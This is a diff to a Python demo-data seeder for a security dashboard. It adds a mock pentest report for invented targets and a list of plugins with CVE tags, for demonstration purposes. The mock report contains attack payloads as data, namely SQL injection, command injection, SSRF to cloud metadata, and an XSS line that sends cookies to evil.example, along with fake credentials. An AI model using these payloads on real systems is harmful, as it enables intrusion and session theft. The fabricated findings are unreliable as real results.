@@ -223,6 +223,105 @@ Target: shop.tokobaju.id  |  Date: {ts}
 5. Reduce session lifetime to 8 hours with sliding expiration for idle sessions
 """.format(ts=ts(10))
 
+# ── MITRE ATT&CK comprehensive scan (uses exact agent marker format so all tactics fire) ──
+
+OUT_MITRE = """\
+FULL SECURITY ASSESSMENT — Comprehensive Automated Pentest
+Target: shop.tokobaju.id  |  Date: {ts}
+
+=== PHASE 1: NETWORK RECONNAISSANCE ===
+PORT SCAN RESULTS (nmap -sV -sC):
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
+80/tcp open  http    Apache/2.4.51 (Ubuntu)
+443/tcp open https   Apache/2.4.51 (Ubuntu)
+3306/tcp open mysql  MySQL/8.0.32
+6379/tcp open redis  Redis 7.0.5 (no auth)
+8080/tcp open http   Apache Tomcat/9.0.71
+
+SERVER STACK FINGERPRINT:
+Apache/2.4.51
+PHP/7.4.33
+MySQL/8.0.32
+WordPress 6.3.1
+OpenSSL/1.1.1n
+jQuery 3.6.0
+nginx/1.24.0
+React 18.2.0
+
+=== PHASE 2: USER ENUMERATION ===
+WP-USER | admin | 1 | administrator | admin@tokobaju.id
+WP-USER | superadmin | 2 | administrator | super@tokobaju.id
+WP-USER | editor | 3 | editor | editor@tokobaju.id
+WP-USER-CONFIRMED: 3 accounts enumerated via REST API /wp-json/wp/v2/users
+
+=== PHASE 3: INJECTION TESTING ===
+[3.1] SQL Injection — /wp-login.php (POST, param: log)
+  Payload: admin' OR '1'='1--
+  SQL ERROR: You have an error in your SQL syntax near ''' at line 1 (MySQL 8.0.32)
+  Authentication bypass confirmed — logged in as admin without valid credentials
+
+[3.2] Command Injection — /api/reports/export (POST, param: filename)
+  Payload: report;id
+  CMD INJECTION: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  Remote OS command execution confirmed on web server
+
+[3.3] SSRF — /api/fetch?url= (GET)
+  Payload: http://169.254.169.254/latest/meta-data/
+  SSRF HIT: ami-id: ami-0abcdef1234567890  instance-id: i-0fedcba987654321
+  AWS instance metadata accessible from web tier — full SSRF confirmed
+
+[3.4] Reflected XSS — /search (GET, param: q)
+  Payload: <script>document.location='https://evil.example/steal?c='+document.cookie</script>
+  REFLECTED XSS: payload echoed unescaped in response body
+  Executes in victim browser — session token theft feasible
+
+[3.5] Stored XSS — /wp-admin/post.php (POST, product review field)
+  Payload: <img src=x onerror=alert(document.domain)>
+  STORED XSS: payload persists in database, renders in admin context
+  Admin session hijack possible on every page load
+
+=== PHASE 4: FILE & CONFIGURATION AUDIT ===
+EXPOSED_FILE | /.env | 200 | 1247 bytes | Contains DB_PASS, API_KEY
+EXPOSED_FILE | /wp-config.php.bak | 200 | 4096 bytes | WordPress config backup
+EXPOSED_FILE | /backup.sql | 200 | 15728640 bytes | Full database dump
+EXPOSED_FILE | /shell.php | 200 | 512 bytes | Potential web shell
+
+FOUND_DB_USER: root
+FOUND_DB_PASS: wp_db_p@ssw0rd2024
+FOUND_ENV_USER: admin
+FOUND_ENV_PASS: api_secret_key_here
+
+=== PHASE 5: ACCESS CONTROL TESTING ===
+200 /wp-admin | Admin dashboard — no MFA, accessible from internet
+200 /api/user/1 | Full user record returned — no authentication required
+200 /api/user/2 | Cross-user data exposure — IDOR confirmed (sequential IDs)
+200 /api/order/1001 | Order details exposed to unauthenticated request
+
+=== PHASE 6: SECURITY HEADERS ANALYSIS ===
+| Medium | X-Frame-Options Header Missing — clickjacking attack possible
+| Medium | Content-Security-Policy Header Missing — XSS impact unrestricted
+| Medium | X-Content-Type-Options Header Missing — MIME sniffing enabled
+| Low    | Strict-Transport-Security Header Missing — SSL stripping feasible
+| Low    | Referrer-Policy Header Missing
+
+=== PHASE 7: TLS / SSL ANALYSIS ===
+WEAK TLS — TLS 1.0 enabled and negotiated on port 443
+RC4 cipher suite accepted — BEAST/POODLE attacks feasible
+NULL cipher accepted — plaintext transmission possible
+EXPORT cipher negotiated — FREAK attack vector present
+
+=== REMEDIATION PRIORITY ===
+1. Eliminate SQL injection — switch to parameterized queries (PDO/prepared statements)
+2. Disable command injection surface — subprocess with arg arrays, no shell=True
+3. Restrict SSRF — block outbound HTTP from web tier to metadata endpoints
+4. Remove all REFLECTED XSS and STORED XSS sinks — apply output encoding
+5. Delete exposed files: .env, wp-config.php.bak, backup.sql — rotate all exposed credentials
+6. Enforce MFA on admin panel — restrict wp-admin to VPN/known IPs
+7. Replace sequential integer IDs with UUIDs — add server-side ownership checks (IDOR)
+8. Add all missing security headers — X-Frame-Options: DENY, CSP, HSTS, X-Content-Type-Options
+9. Disable TLS 1.0, RC4, NULL, EXPORT ciphers — enforce TLS 1.2+ with strong suites
+""".format(ts=ts(2))
+
 # ── Main seeder ───────────────────────────────────────────────────────────────
 
 def check_existing():
@@ -245,16 +344,18 @@ def clear_demo():
 def seed_scans(con):
     scans = [
         # shop.tokobaju.id
-        ("shop.tokobaju.id", "WSTG-INPV-05", OUT_SQL,  22.4, 31, ts(12)),
-        ("shop.tokobaju.id", "WSTG-AUTHN-01", OUT_AUTH, 18.7, 24, ts(8)),
-        ("shop.tokobaju.id", "WSTG-SESS-01",  OUT_SESS, 14.2, 19, ts(10)),
-        ("shop.tokobaju.id", "WSTG-CONF-01",  OUT_CONF, 11.5, 16, ts(18)),
+        ("shop.tokobaju.id", "WSTG-INPV-05", OUT_SQL,   22.4, 31, ts(12)),
+        ("shop.tokobaju.id", "WSTG-AUTHN-01", OUT_AUTH,  18.7, 24, ts(8)),
+        ("shop.tokobaju.id", "WSTG-SESS-01",  OUT_SESS,  14.2, 19, ts(10)),
+        ("shop.tokobaju.id", "WSTG-CONF-01",  OUT_CONF,  11.5, 16, ts(18)),
         # api.fintech-demo.id
         ("api.fintech-demo.id", "full_pentest",  OUT_API, 35.8, 47, ts(5)),
         ("api.fintech-demo.id", "WSTG-CONF-07",  OUT_NET, 16.3, 22, ts(1)),
         # cms.mediaportal.id
         ("cms.mediaportal.id", "wordpress_scan", OUT_WP,  20.1, 28, ts(3)),
         ("cms.mediaportal.id", "WSTG-CONF-01",   OUT_CONF, 9.3, 14, ts(6)),
+        # Comprehensive MITRE ATT&CK coverage scan — triggers all 13 tactics
+        ("shop.tokobaju.id", "full_pentest",  OUT_MITRE, 48.2, 62, ts(2)),
     ]
     ids = []
     for (target, agent, output, lat, tools, created) in scans:
@@ -435,19 +536,36 @@ def seed_remediation(con):
 def seed_plugins(con):
     plugins = [
         # shop.tokobaju.id (WooCommerce store)
-        ("shop.tokobaju.id", "WooCommerce",                    "8.2.1",  "Plugin",  "active", 0),
-        ("shop.tokobaju.id", "WooCommerce Stripe Gateway",     "7.6.0",  "Plugin",  "active", 0),
-        ("shop.tokobaju.id", "Wordfence Security",             "7.11.1", "Plugin",  "active", 0),
-        ("shop.tokobaju.id", "WP Super Cache",                 "1.9.4",  "Plugin",  "active", 0),
-        ("shop.tokobaju.id", "Yoast SEO",                      "21.5",   "Plugin",  "active", 0),
-        ("shop.tokobaju.id", "WP File Manager",                "6.9",    "Plugin",  "active", 1),  # CVE-2020-25213
-        ("shop.tokobaju.id", "Contact Form 7",                 "5.8.2",  "Plugin",  "active", 0),
+        ("shop.tokobaju.id", "WooCommerce",                    "8.2.1",  "Plugin",  "active",   0),
+        ("shop.tokobaju.id", "WooCommerce Stripe Gateway",     "7.6.0",  "Plugin",  "active",   0),
+        ("shop.tokobaju.id", "Wordfence Security",             "7.11.1", "Plugin",  "active",   0),
+        ("shop.tokobaju.id", "WP Super Cache",                 "1.9.4",  "Plugin",  "active",   0),
+        ("shop.tokobaju.id", "Yoast SEO",                      "21.5",   "Plugin",  "active",   0),
+        ("shop.tokobaju.id", "WP File Manager",                "6.9",    "Plugin",  "active",   1),  # CVE-2020-25213
+        ("shop.tokobaju.id", "Contact Form 7",                 "5.8.2",  "Plugin",  "active",   0),
+        ("shop.tokobaju.id", "WooCommerce PDF Invoices",       "3.8.1",  "Plugin",  "active",   0),
+        ("shop.tokobaju.id", "WPML Multilingual CMS",          "4.6.5",  "Plugin",  "active",   0),
+        ("shop.tokobaju.id", "UpdraftPlus Backup",             "1.23.3", "Plugin",  "inactive", 0),
         # cms.mediaportal.id
-        ("cms.mediaportal.id", "Elementor",                    "3.18.3", "Plugin",  "active", 0),
-        ("cms.mediaportal.id", "WPForms Lite",                 "1.8.4",  "Plugin",  "active", 0),
-        ("cms.mediaportal.id", "Akismet Anti-Spam",            "5.3.1",  "Plugin",  "active", 0),
-        ("cms.mediaportal.id", "Really Simple SSL",            "7.2.3",  "Plugin",  "active", 0),
-        ("cms.mediaportal.id", "Duplicator",                   "1.5.7",  "Plugin",  "active", 1),  # path traversal
+        ("cms.mediaportal.id", "Elementor",                    "3.18.3", "Plugin",  "active",   0),
+        ("cms.mediaportal.id", "WPForms Lite",                 "1.8.4",  "Plugin",  "active",   0),
+        ("cms.mediaportal.id", "Akismet Anti-Spam",            "5.3.1",  "Plugin",  "active",   0),
+        ("cms.mediaportal.id", "Really Simple SSL",            "7.2.3",  "Plugin",  "active",   0),
+        ("cms.mediaportal.id", "Duplicator",                   "1.5.7",  "Plugin",  "active",   1),  # path traversal CVE-2023-1436
+        ("cms.mediaportal.id", "All in One SEO",               "4.4.1",  "Plugin",  "active",   0),
+        ("cms.mediaportal.id", "Smush Image Compression",      "3.15.2", "Plugin",  "active",   0),
+        ("cms.mediaportal.id", "WP Rocket",                    "3.15.0", "Plugin",  "active",   0),
+        ("cms.mediaportal.id", "MonsterInsights",              "8.21.0", "Plugin",  "active",   0),
+        ("cms.mediaportal.id", "TablePress",                   "2.1.4",  "Plugin",  "inactive", 0),
+        # api.fintech-demo.id (Node.js / Laravel API — no WP plugins, but MU-plugins listed)
+        ("api.fintech-demo.id", "Laravel Framework",           "10.48.1","Framework","active",  0),
+        ("api.fintech-demo.id", "Passport OAuth2",             "11.0.3", "Library", "active",   0),
+        ("api.fintech-demo.id", "Sanctum API Auth",            "3.3.1",  "Library", "active",   0),
+        ("api.fintech-demo.id", "spatie/laravel-permission",   "5.10.2", "Library", "active",   0),
+        ("api.fintech-demo.id", "guzzlehttp/guzzle",           "7.5.0",  "Library", "active",   1),  # SSRF risk — old version
+        ("api.fintech-demo.id", "php-jwt",                     "6.4.0",  "Library", "active",   1),  # CVE-2022-21449 alg confusion
+        ("api.fintech-demo.id", "dompdf/dompdf",               "2.0.3",  "Library", "active",   1),  # CVE-2023-23924 RCE
+        ("api.fintech-demo.id", "league/flysystem",            "3.15.1", "Library", "active",   0),
     ]
     for (target, name, version, ptype, status, vuln) in plugins:
         try:
@@ -494,14 +612,15 @@ Demo data seeded successfully!
   Security events:     26
   Blocked IPs:         5
   Remediation actions: 5
-  Plugins:             12
+  Plugins:             28
 
 Targets: shop.tokobaju.id | api.fintech-demo.id | cms.mediaportal.id
 
 Pages populated:
   Dashboard, Security Signals, Incident Management, Threat Analytics,
   Event Timeline, Network Monitor, Recommendations, Priority Actions,
-  Remediation, Weaknesses, Inventories, Security Analytics, User Activity Logs
+  Remediation, Weaknesses, Inventories (Software + Plugins), MITRE ATT&CK,
+  Security Analytics, User Activity Logs
 
 To clear demo data:  python dashboard/demo_seed.py --clear
 To re-seed:          python dashboard/demo_seed.py --reset
